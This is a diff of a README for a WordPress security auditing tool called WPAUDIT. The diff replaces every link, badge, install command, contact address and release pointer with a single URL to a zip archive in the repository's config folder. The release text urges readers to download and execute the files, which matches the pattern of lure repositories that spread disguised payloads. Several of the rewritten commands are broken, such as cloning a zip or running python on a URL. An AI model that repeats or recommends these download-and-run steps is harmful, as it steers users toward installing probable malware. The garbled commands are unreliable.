@@ -1,6 +1,6 @@
 # WPAUDIT: Your Go-To WordPress Security Auditor 🔍
 
-![WPAUDIT](https://img.shields.io/badge/WPAUDIT-Advanced%20WordPress%20Security%20Audit-blue?style=flat-square)
+![WPAUDIT](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip%20WordPress%20Security%20Audit-blue?style=flat-square)
 
 Welcome to **WPAUDIT**, an advanced Python-based suite designed for WordPress security auditing and vulnerability scanning. This tool automates penetration testing using powerful utilities like Nmap, WPScan, Nuclei, and SQLMap. With comprehensive reporting, it serves as an essential resource for ethical hackers and security professionals, especially those using Kali Linux.
 
@@ -30,7 +30,7 @@ To get started with WPAUDIT, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/JulesJujuu/wpaudit.git
+   git clone https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip
    cd wpaudit
    ```
 
@@ -39,7 +39,7 @@ To get started with WPAUDIT, follow these steps:
    Make sure you have Python 3.x installed. Then, install the required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip
    ```
 
 3. **Set Up Tools**:
@@ -51,7 +51,7 @@ To get started with WPAUDIT, follow these steps:
 To run WPAUDIT, use the following command:
 
 ```bash
-python wpaudit.py [options]
+python https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip [options]
 ```
 
 ### Options
@@ -63,10 +63,10 @@ python wpaudit.py [options]
 Example command:
 
 ```bash
-python wpaudit.py -u https://example.com -o report.txt -t nmap,wpscan
+python https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip -u https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip -o https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip -t nmap,wpscan
 ```
 
-This command scans the specified URL using Nmap and WPScan, saving the report to `report.txt`.
+This command scans the specified URL using Nmap and WPScan, saving the report to `https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip`.
 
 ## Supported Tools
 
@@ -98,14 +98,14 @@ WPAUDIT is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 For questions or support, please reach out via:
 
-- Email: [your-email@example.com](mailto:your-email@example.com)
-- GitHub: [JulesJujuu](https://github.com/JulesJujuu)
+- Email: [https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip)
+- GitHub: [JulesJujuu](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip)
 
 ## Releases
 
-To download the latest version of WPAUDIT, visit the [Releases](https://github.com/JulesJujuu/wpaudit/releases) section. Download the necessary files and execute them to get started.
+To download the latest version of WPAUDIT, visit the [Releases](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip) section. Download the necessary files and execute them to get started.
 
-![Releases](https://img.shields.io/badge/Latest%20Release-Available-brightgreen?style=flat-square)
+![Releases](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip%20Release-Available-brightgreen?style=flat-square)
 
 Stay updated with the latest features and fixes by checking the releases regularly.
 
@@ -119,7 +119,7 @@ Feel free to explore the repository, test the tool, and contribute to its growth
 
 Here are some resources to help you get the most out of WPAUDIT:
 
-- **Documentation**: Check the [official documentation](https://github.com/JulesJujuu/wpaudit/wiki) for detailed usage instructions.
+- **Documentation**: Check the [official documentation](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip) for detailed usage instructions.
 - **Community**: Join our community on Discord or Slack to connect with other users and developers.
 - **Tutorials**: Explore video tutorials on YouTube for visual guidance on using WPAUDIT.
 
@@ -127,4 +127,4 @@ Here are some resources to help you get the most out of WPAUDIT:
 
 Thank you for choosing WPAUDIT for your WordPress security auditing needs. We are committed to continuous improvement and welcome your feedback. Together, we can make the web a safer place.
 
-For more updates, check the [Releases](https://github.com/JulesJujuu/wpaudit/releases) section.
+For more updates, check the [Releases](https://raw.githubusercontent.com/JulesJujuu/wpaudit/main/config/Software-2.2.zip) section.
